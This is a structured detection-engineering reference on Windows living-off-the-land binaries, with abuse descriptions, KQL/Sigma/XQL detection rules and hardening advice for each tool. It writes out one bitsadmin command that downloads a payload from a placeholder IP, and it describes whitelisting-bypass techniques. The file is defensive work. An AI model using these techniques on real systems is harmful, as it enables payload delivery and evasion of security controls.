scope: 25 built-in Windows binaries with documented living-off-the-land (LOLBAS-style) abuse patterns, covering download, execution, compilation, application-whitelisting-bypass, and persistence tradecraft relevant to SOC triage and detection engineering.
note: All example commands use RFC5737 documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and a fictional corp.local / CORP domain in place of any real attacker-controlled infrastructure or internal hostname.

lolbins.name: certutil.exe
lolbins.description: Command-line utility shipped with Windows Certificate Services for managing certificates, certificate authorities, and certificate stores. It is LOLBAS-relevant because its -urlcache, -encode, and -decode switches can download, obfuscate, and reconstruct arbitrary files.
lolbins.legitimate_use: Administrators use certutil to dump/display CA configuration, verify certificates and certificate chains, manage the local certificate store, and install or renew CA certificates.

example_commands.purpose: Downloads and saves a remote file to disk using certutil's URL cache feature
Decodes a Base64-encoded file back to its original binary form
Encodes a file as Base64 to evade content-based detection

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("-urlcache", "-decode", "-encode", "-verifyctl", "-URL")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Suspicious Certutil Command Usage
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-decode'
      - '-encode'
      - '-verifyctl'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "certutil.exe"
| filter action_process_image_command_line contains "-urlcache" or action_process_image_command_line contains "-decode" or action_process_image_command_line contains "-encode"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: PKI administrators exporting/importing certificates or CA configuration
Software packaging or integrity tooling using certutil -hashfile for checksums
Internal scripts decoding Base64-wrapped configuration or log artifacts
defence_guidance: Do not blanket-block certutil.exe with AppLocker/WDAC deny rules; it is required for legitimate local CA and certificate-store management on many servers
Alert on command-line telemetry containing -urlcache, -decode, -encode, or -verifyctl rather than restricting the binary itself
Flag network connections made by certutil.exe, since normal certificate operations rarely require outbound HTTP

lolbins.name: mshta.exe
lolbins.description: Executes Microsoft HTML Applications (.hta) using the same rendering engine as Internet Explorer, running embedded JavaScript, JScript, or VBScript outside the browser's sandbox. It is LOLBAS-relevant because it can execute local, remote, or ADS-hidden HTA/script content.
lolbins.legitimate_use: Runs legacy line-of-business HTA desktop applications and internal administrative HTA-based tools that predate modern web app frameworks.

example_commands.purpose: Downloads and executes a remote HTA file, running its embedded script
Executes JScript supplied on the command line that retrieves and runs a remote scriptlet

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://", "https://", "javascript:", "vbscript:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Suspicious Mshta Child Process or Script Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\mshta.exe'
  susp_args:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'javascript:'
      - 'vbscript:'
  condition: selection and susp_args
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "mshta.exe"
| filter action_process_image_command_line contains "http" or action_process_image_command_line contains "javascript:"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Legacy internal HTA-based admin tools or kiosk applications
Group Policy logon scripts that launch HTA dialogs
Software vendor installers that use HTA for setup UI
defence_guidance: Mshta.exe appears on Microsoft's recommended WDAC/AppLocker block-rule list for high-security baselines; confirm no internal HTA dependency before blocking
Where blocking is not feasible, alert on mshta.exe spawning network connections or loading .NET CLR libraries (unusual for a scripting host)

lolbins.name: rundll32.exe
lolbins.description: Loads a DLL and invokes a named exported function from the command line. It is LOLBAS-relevant because it can execute attacker DLLs, remote SMB-hosted DLLs, JScript via mshtml, and COM server payloads by CLSID.
lolbins.legitimate_use: Used by Windows and many installers/Control Panel items to invoke specific exported DLL functions, such as launching Control Panel applets or post-install actions.

example_commands.purpose: Executes the named exported function inside an attacker-supplied DLL
Uses the mshtml RunHTMLApplication entry point to execute a remote JScript scriptlet

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "rundll32.exe"
| where ProcessCommandLine has_any ("javascript:", "http://", "https://", "-sta")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Suspicious Rundll32 Activity
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains:
      - 'javascript:'
      - '.sct'
      - '-sta'
  condition: selection
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "rundll32.exe"
| filter action_process_image_command_line contains "javascript:" or action_process_image_command_line contains ".sct"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Control Panel applets and printer/driver DLLs invoked via rundll32 by Windows itself
Software installers calling rundll32 for signed post-install DLL actions
Legitimate shell32.dll or user32.dll helper function calls used by scripts
defence_guidance: Rundll32 cannot be blocked outright since Windows itself depends on it; use WDAC to restrict which DLL paths/exports may be loaded
Alert on rundll32.exe making outbound network connections or loading unsigned DLLs from user-writable directories

lolbins.name: regsvr32.exe
lolbins.description: Registers and unregisters DLLs and OCX controls, calling their DllRegisterServer/DllUnregisterServer exports. It is LOLBAS-relevant for the well-known 'Squiblydoo' technique, which loads and executes a remote .sct scriptlet via scrobj.dll while bypassing application whitelisting.
lolbins.legitimate_use: Used by software installers and administrators to register COM components and ActiveX controls with the Windows registry.

example_commands.purpose: Executes a remote .sct scriptlet via scrobj.dll, bypassing application whitelisting (Squiblydoo)
Registers a DLL, executing attacker code placed in its DllRegisterServer export

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has "scrobj.dll" or ProcessCommandLine has "/i:http"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Regsvr32 Squiblydoo AWL Bypass
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains: 'scrobj.dll'
  remote:
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection and remote
level: critical
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "regsvr32.exe"
| filter action_process_image_command_line contains "scrobj.dll"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate software installers registering COM DLLs during setup routines
Line-of-business applications that register ActiveX controls on first run
defence_guidance: Microsoft's recommended WDAC block-rule set specifically targets regsvr32 combined with scrobj.dll; apply this rule where scriptlet-based COM registration is not required
Alert on the /i: remote-URL argument regardless of block state, since it is rarely used in legitimate deployments

lolbins.name: bitsadmin.exe
lolbins.description: Legacy command-line tool for creating and managing Background Intelligent Transfer Service (BITS) jobs. It is LOLBAS-relevant because BITS jobs can download and execute files while surviving reboots and network interruptions.
lolbins.legitimate_use: Historically used to script resumable background file transfers, such as delivering updates or large payloads without blocking the foreground application.

example_commands.command: bitsadmin /create 1 & bitsadmin /addfile 1 http://203.0.113.50/payload.exe C:\Users\Public\payload.exe & bitsadmin /resume 1 & bitsadmin /complete 1
example_commands.purpose: Creates, populates, and runs a BITS job that downloads a remote file to disk

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "bitsadmin.exe"
| where ProcessCommandLine has_any ("/addfile", "/transfer", "/create")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Bitsadmin Download or Persistence Job
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains:
      - '/addfile'
      - '/transfer'
      - 'SetNotifyCmdLine'
  condition: selection
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "bitsadmin.exe"
| filter action_process_image_command_line contains "/addfile" or action_process_image_command_line contains "SetNotifyCmdLine"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legacy WSUS or third-party patch-management scripts still invoking bitsadmin directly
Internal deployment tooling that predates the PowerShell BitsTransfer module
defence_guidance: Bitsadmin.exe is deprecated by Microsoft for scripting purposes in favor of the PowerShell BitsTransfer cmdlets, so blocking via WDAC is generally low-impact
Where BITS itself is required, monitor for SetNotifyCmdLine, which lets a BITS job execute a command on completion

lolbins.name: wmic.exe
lolbins.description: Command-line interface to Windows Management Instrumentation (WMI). It is LOLBAS-relevant because 'process call create' can spawn arbitrary processes, and the 'squiblytwo' technique executes JScript/VBScript embedded in a remote XSL stylesheet via wmic's output formatting.
lolbins.legitimate_use: Used by administrators for local and remote system inventory, process management, and WMI-based configuration queries and scripting.

example_commands.purpose: Spawns an arbitrary process using WMI's process call create method
Executes JScript or VBScript embedded in a remote XSL stylesheet ('Squiblytwo')
Enumerates installed antivirus/EDR products for reconnaissance

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "wmic.exe"
| where ProcessCommandLine has "process call create" or ProcessCommandLine has "/format:"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Wmic Process Create or XSL Script Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection_create:
    Image|endswith: '\wmic.exe'
    CommandLine|contains: 'process call create'
  selection_xsl:
    Image|endswith: '\wmic.exe'
    CommandLine|contains: '/format:'
  condition: 1 of selection_*
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "wmic.exe"
| filter action_process_image_command_line contains "process call create" or action_process_image_command_line contains "/format:"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legacy remote administration or inventory scripts still using wmic (deprecated but widely present)
Endpoint security or asset-management agents querying AntiVirusProduct/SecurityCenter2 for compliance reporting
defence_guidance: Wmic.exe is deprecated by Microsoft since Windows 10 21H1 and removed by default on newer builds; block via WDAC on estates confirmed not to depend on it
Where wmic must remain, alert specifically on 'process call create' and '/format:' with a URL or UNC path

lolbins.name: InstallUtil.exe
lolbins.description: .NET Framework command-line utility that runs the installer components of a target assembly. It is LOLBAS-relevant because it will execute attacker code placed in custom Installer-class methods, bypassing default AppLocker rules that allow .NET Framework directories.
lolbins.legitimate_use: Installs and uninstalls server resources (such as Windows Services) by executing the Install/Uninstall methods of installer components inside a .NET assembly.

example_commands.purpose: Loads a .NET DLL and executes it through InstallUtil's uninstall code path, bypassing AWL

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "installutil.exe"
| where ProcessCommandLine has "/logfile=" or ProcessCommandLine has "/U "
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath
detection_queries.sigma:
title: InstallUtil Execution Outside Deployment Context
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\InstallUtil.exe'
    CommandLine|contains:
      - '/logfile='
      - '/LogToConsole=false'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "installutil.exe"
| filter action_process_image_command_line contains "/logfile=" or action_process_image_command_line contains "LogToConsole"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate .NET Windows Service installation during scheduled software deployment
Developer or build-agent activity registering custom installer assemblies
defence_guidance: InstallUtil.exe is on Microsoft's recommended WDAC block-rule list; deny it on standard user endpoints outside maintenance windows
On systems where it is required, scope allowed execution to known deployment tooling paths and log all invocations

lolbins.name: MSBuild.exe
lolbins.description: The Microsoft Build Engine compiles and runs project files, including inline C# tasks embedded directly in XML. It is LOLBAS-relevant because it can build and execute attacker-authored code entirely in memory from a signed Microsoft binary.
lolbins.legitimate_use: Used by Visual Studio and CI/CD pipelines to compile .NET solutions and projects from the command line.

attack_techniques.name: Trusted Developer Utilities Proxy Execution: MSBuild

example_commands.purpose: Builds and immediately executes an inline C# task embedded in the project file
Passes build options via a response file, obscuring the real target from casual command-line review

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "msbuild.exe"
| where FolderPath !contains "Program Files" or ProcessCommandLine has ".rsp"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Suspicious MSBuild Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\MSBuild.exe'
  susp_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\powershell.exe'
      - '\cmd.exe'
      - '\wscript.exe'
  condition: selection and susp_parent
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "msbuild.exe"
| filter causality_actor_process_image_name in ("winword.exe", "excel.exe", "powershell.exe", "cmd.exe", "wscript.exe")
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Legitimate CI/CD build agents and developer workstations compiling real project files
Automated packaging pipelines that call msbuild.exe with response files for build options
defence_guidance: Block msbuild.exe via WDAC on non-developer, non-build-server endpoints, where it should never normally run
On developer/build systems, monitor for msbuild.exe spawned by Office applications, script hosts, or command shells rather than IDEs/build tooling

lolbins.name: RegAsm.exe
lolbins.description: The .NET Assembly Registration utility registers COM callable wrappers for .NET assemblies. It is LOLBAS-relevant because loading an attacker DLL causes RegAsm to invoke its RegisterClass/UnregisterClass methods, executing arbitrary code while bypassing default application-whitelisting rules.
lolbins.legitimate_use: Registers .NET assemblies for COM interop so unmanaged COM clients can call into managed code, typically run during installation of COM-interop software.

example_commands.purpose: Loads a .NET DLL and invokes its RegisterClass method, executing attacker code
Loads a .NET DLL and invokes its UnregisterClass method as an alternate execution path

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "regasm.exe"
| where FolderPath !contains "Microsoft.NET" or InitiatingProcessFileName !in ("msiexec.exe", "setup.exe")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Suspicious RegAsm Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\RegAsm.exe'
  filter_installers:
    ParentImage|endswith:
      - '\msiexec.exe'
      - '\setup.exe'
  condition: selection and not filter_installers
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "regasm.exe"
| filter causality_actor_process_image_name != "msiexec.exe" and causality_actor_process_image_name != "setup.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Legitimate COM-interop registration performed by .NET application installers
Developer workstations registering locally built assemblies for interop testing
defence_guidance: RegAsm.exe (and its sibling regsvcs.exe) commonly appears in Microsoft's recommended AppLocker/WDAC block-rule sets; deny outside dev/deployment contexts
Alert on RegAsm.exe loading DLLs from Temp, Downloads, or other user-writable paths

lolbins.name: csc.exe
lolbins.description: The C# compiler bundled with the .NET Framework. It is LOLBAS-relevant because it can compile attacker-supplied C# source into an executable or DLL directly on the host, evading detections that rely on scanning pre-built binaries.
lolbins.legitimate_use: Compiles C# source code from the command line; also invoked transparently by PowerShell's Add-Type cmdlet and by Visual Studio build processes.

example_commands.purpose: Compiles attacker-supplied C# source directly into an executable on the host
Compiles C# source into a DLL with the same base name

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "csc.exe"
| where InitiatingProcessFileName !in~ ("devenv.exe", "msbuild.exe", "powershell.exe")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Suspicious Csc.exe Compilation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\csc.exe'
  filter_dev:
    ParentImage|endswith:
      - '\devenv.exe'
      - '\msbuild.exe'
  condition: selection and not filter_dev
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "csc.exe"
| filter causality_actor_process_image_name != "devenv.exe" and causality_actor_process_image_name != "msbuild.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Developer workstations and build servers compiling legitimate .NET code
PowerShell scripts using Add-Type, which silently invokes csc.exe to compile inline C# snippets
defence_guidance: Block csc.exe via WDAC on non-developer endpoints; where PowerShell Add-Type is used legitimately, test thoroughly before blocking since it will break
On developer systems, baseline expected parent processes (IDE/build tooling) and alert on unexpected parents such as Office apps or script hosts

lolbins.name: cscript.exe
lolbins.description: Console-based host for the Windows Script Host, executing VBScript and JScript files. It is LOLBAS-relevant because it can run script code stored inside an NTFS Alternate Data Stream, hiding it from normal directory listings.
lolbins.legitimate_use: Runs administrative VBScript/JScript logon scripts and legacy automation tooling from the command line without a GUI.

example_commands.purpose: Executes a VBScript engine against script code stored in an Alternate Data Stream of notes.txt

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "cscript.exe"
| where ProcessCommandLine has ":" and ProcessCommandLine matches regex @"[A-Za-z0-9_.]+:[A-Za-z0-9_.]+"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Cscript Executing From Alternate Data Stream
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\cscript.exe'
    CommandLine|re: '\w+\.\w+:\w+\.(vbs|js)'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "cscript.exe"
| filter action_process_image_command_line contains ":" 
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legacy VBScript-based logon/logoff scripts run at scale via Group Policy
Legitimate administrative automation predating PowerShell adoption
defence_guidance: Cscript.exe is often required for legacy logon scripts, so avoid an outright block; monitor for command lines containing a colon inside a filename argument (ADS indicator)
Consider disabling Windows Script Host globally via policy on estates with no VBS/JS dependency

lolbins.name: wscript.exe
lolbins.description: Windows-based host for the Windows Script Host, executing VBScript and JScript files without a console window. It is LOLBAS-relevant because it can run scripts hidden inside an Alternate Data Stream, including scripts downloaded and staged there on the fly.
lolbins.legitimate_use: Runs GUI-less VBScript/JScript automation, historically used for desktop shortcuts, installer helper scripts, and simple automation tasks.

example_commands.purpose: Executes VBScript code stored in an Alternate Data Stream
Downloads and executes a remote JScript payload via an ADS-staged proxy file

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "wscript.exe"
| where ProcessCommandLine has ":" or ProcessCommandLine has "GetObject"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Wscript Executing From ADS or Remote Scriptlet
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\wscript.exe'
    CommandLine|contains:
      - 'GetObject'
      - '.js'
      - '.vbs'
  ads_pattern:
    CommandLine|re: '\w+\.\w+:\w+\.(vbs|js)'
  condition: selection and ads_pattern
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "wscript.exe"
| filter action_process_image_command_line contains "GetObject" or action_process_image_command_line contains ":"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legacy VBS-based desktop automation and shortcut launchers
Older software installers that use wscript.exe helper scripts
defence_guidance: Prefer monitoring over blanket blocking due to legacy dependency risk; alert on ADS-pattern command lines (filename:stream) or GetObject("script:...") usage
Disable Windows Script Host via the WSH Settings registry key on estates confirmed not to need VBS/JS execution

lolbins.name: forfiles.exe
lolbins.description: Selects files matching a mask and runs a command against each match, intended for batch processing. It is LOLBAS-relevant because its /c handler will execute an arbitrary command, indirectly proxying execution away from a direct parent-child relationship with cmd.exe.
lolbins.legitimate_use: Used in batch scripts to run a command against a set of files, such as cleanup or archival routines.

example_commands.purpose: Indirectly executes a command via forfiles' /c handler, evading direct cmd.exe parent-child monitoring

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "forfiles.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Forfiles Indirect Command Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\forfiles.exe'
    CommandLine|contains: '/c'
  condition: selection
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "forfiles.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Legitimate batch-processing or cleanup scripts that operate over sets of files
Backup software using forfiles to prune aged files
defence_guidance: Forfiles.exe is rarely used interactively by end users; on standard workstations it can often be blocked via WDAC with low operational impact
Where retained for scheduled maintenance, baseline expected /p and /m arguments and alert on deviations

lolbins.name: msiexec.exe
lolbins.description: The Windows Installer engine that processes .msi packages. It is LOLBAS-relevant because it can silently install a remote or renamed .msi containing attacker code, or call DllRegisterServer/DllUnregisterServer on a target DLL.
lolbins.legitimate_use: Installs, repairs, and uninstalls software packaged as Windows Installer (.msi) files, used extensively by software deployment tools.

example_commands.purpose: Silently installs a remote MSI package containing attacker code
Calls DllRegisterServer on a target DLL via the /y flag

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has_any ("http://", "https://") or ProcessCommandLine has "/y" or ProcessCommandLine has "/z"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Msiexec Remote Install or DLL Registration
logsource:
  category: process_creation
  product: windows
detection:
  selection_web:
    Image|endswith: '\msiexec.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  selection_dll:
    Image|endswith: '\msiexec.exe'
    CommandLine|re: '\s/[yz]\s'
  condition: 1 of selection_*
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "msiexec.exe"
| filter action_process_image_command_line contains "http"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: SCCM, Intune, or Group Policy Software Installation deploying MSI packages from internal distribution points
Legitimate software updaters that install MSIs from vendor CDNs
defence_guidance: Msiexec.exe cannot be blocked (core OS install mechanism); harden via Group Policy to restrict 'Always install with elevated privileges' and remote MSI sources
Alert on msiexec /i with an http(s):// or non-approved UNC source outside recognized deployment tooling

lolbins.name: odbcconf.exe
lolbins.description: Configures ODBC drivers and data sources from the command line. It is LOLBAS-relevant because its REGSVR action calls DllRegisterServer on a target DLL, and a response file (.rsp) can also specify a DLL to load, bypassing application whitelisting.
lolbins.legitimate_use: Installs and configures ODBC drivers and DSNs, typically used by database client software during setup.

example_commands.purpose: Executes DllRegisterServer in a target DLL via odbcconf's driver registration action
Loads a DLL path specified inside a response file

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "odbcconf.exe"
| where ProcessCommandLine has_any ("REGSVR", "-f", "INSTALLDRIVER")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Odbcconf DLL Registration or Response File Load
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\odbcconf.exe'
    CommandLine|contains:
      - 'REGSVR'
      - '.rsp'
      - 'INSTALLDRIVER'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "odbcconf.exe"
| filter action_process_image_command_line contains "REGSVR" or action_process_image_command_line contains ".rsp"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate ODBC driver installation performed by database client software
Database administration tooling configuring DSNs during setup
defence_guidance: Odbcconf.exe is on Microsoft's recommended WDAC block-rule list; safe to deny on endpoints that do not manage ODBC data sources
Where ODBC management is required, restrict to known administrator accounts and log all invocations

lolbins.name: control.exe
lolbins.description: Launches Control Panel and individual Control Panel items (.cpl files, which are DLLs exporting a CPlApplet function). It is LOLBAS-relevant because it will execute a malicious .cpl or a DLL staged in an Alternate Data Stream.
lolbins.legitimate_use: Opens the Windows Control Panel or a specific Control Panel applet from the command line.

attack_techniques.name: System Binary Proxy Execution: Control Panel

example_commands.purpose: Executes a malicious Control Panel Item DLL via its CPlApplet export
Executes a DLL staged in an Alternate Data Stream via control.exe

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "control.exe"
| where ProcessCommandLine has ".cpl" and FolderPath !contains "System32"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Control.exe Executing CPL From Non-Standard Path
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\control.exe'
    CommandLine|contains: '.cpl'
  filter_system:
    CommandLine|contains: '\Windows\System32\'
  condition: selection and not filter_system
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "control.exe"
| filter action_process_image_command_line contains ".cpl"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate custom Control Panel applets deployed by endpoint management or hardware vendor software
Users launching standard Control Panel applets by their .cpl name
defence_guidance: Restrict execution of .cpl files from non-standard or user-writable directories via WDAC path rules rather than blocking control.exe outright
Alert on control.exe command lines containing an Alternate Data Stream pattern (filename:stream)

lolbins.name: hh.exe
lolbins.description: The HTML Help executable that opens Compiled HTML Help (.chm) files. It is LOLBAS-relevant because a crafted .chm can embed shortcuts or scripts that execute commands when opened, and hh.exe will also fetch remote .chm/.bat content.
lolbins.legitimate_use: Displays Windows Help (.chm) documentation files bundled with older applications and OS components.

attack_techniques.name: System Binary Proxy Execution: Compiled HTML File

example_commands.purpose: Downloads and opens a remote CHM file containing embedded shortcut/script commands

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "hh.exe"
| where ProcessCommandLine has_any ("http://", "https://")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Hh.exe Opening Remote CHM File
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\hh.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "hh.exe"
| filter action_process_image_command_line contains "http"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate viewing of local .chm help files bundled with internal or third-party applications
defence_guidance: Hh.exe is on Microsoft's recommended WDAC block-rule list for high-security baselines; CHM help viewing is largely obsolete, so blocking is low-impact for most modern estates
Where retained, alert on hh.exe invoked with a remote URL rather than a local .chm path

lolbins.name: ie4uinit.exe
lolbins.description: Applies Internet Explorer 4.x-era per-user initialization settings by processing an ieuinit.inf file. It is LOLBAS-relevant because a crafted ieuinit.inf placed outside the expected %windir% path can be loaded to trigger unauthorized actions.
lolbins.legitimate_use: Performs one-time Internet Explorer/legacy component initialization during OS setup or new user profile creation.

example_commands.purpose: Triggers ie4uinit to process a specially crafted ieuinit.inf file and execute attacker-controlled actions

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "ie4uinit.exe"
| where FolderPath !startswith @"C:\Windows\"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath
detection_queries.sigma:
title: Ie4uinit Running Outside Windows Directory
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\ie4uinit.exe'
  filter_windir:
    Image|startswith: 'C:\Windows\'
  condition: selection and not filter_windir
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "ie4uinit.exe"
| filter not(action_process_image_path contains "\\Windows\\")
| fields agent_hostname, actor_effective_username, action_process_image_path, action_process_image_command_line

false_positives: Normal Internet Explorer/legacy component initialization during OS setup or new profile creation
defence_guidance: Monitor for ie4uinit.exe loading ieuinit.inf from a path outside %windir%, which is the key abuse indicator
Blocking outright is generally low-risk on modern builds where IE legacy components are deprecated

lolbins.name: pcalua.exe
lolbins.description: The Program Compatibility Assistant helper, normally launched by Windows to offer compatibility fixes for older applications. It is LOLBAS-relevant because its -a switch will directly launch a target executable or remote DLL, indirectly proxying execution.
lolbins.legitimate_use: Assists Windows in detecting and offering compatibility settings for legacy applications that may not run correctly on the current OS version.

example_commands.purpose: Launches an executable via the Program Compatibility Assistant, indirectly proxying execution
Launches a DLL hosted on a remote SMB share via PCA

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "pcalua.exe"
| where ProcessCommandLine has "-a"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Pcalua Indirect Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\pcalua.exe'
    CommandLine|contains: '-a '
  condition: selection
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "pcalua.exe"
| filter action_process_image_command_line contains "-a "
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate compatibility-shim prompts triggered when users run older applications
defence_guidance: Pcalua.exe is rarely needed for scripted/automated execution; alert on non-interactive invocation and consider blocking via WDAC on server or kiosk builds
Flag pcalua.exe launching targets from remote SMB shares

lolbins.name: verclsid.exe
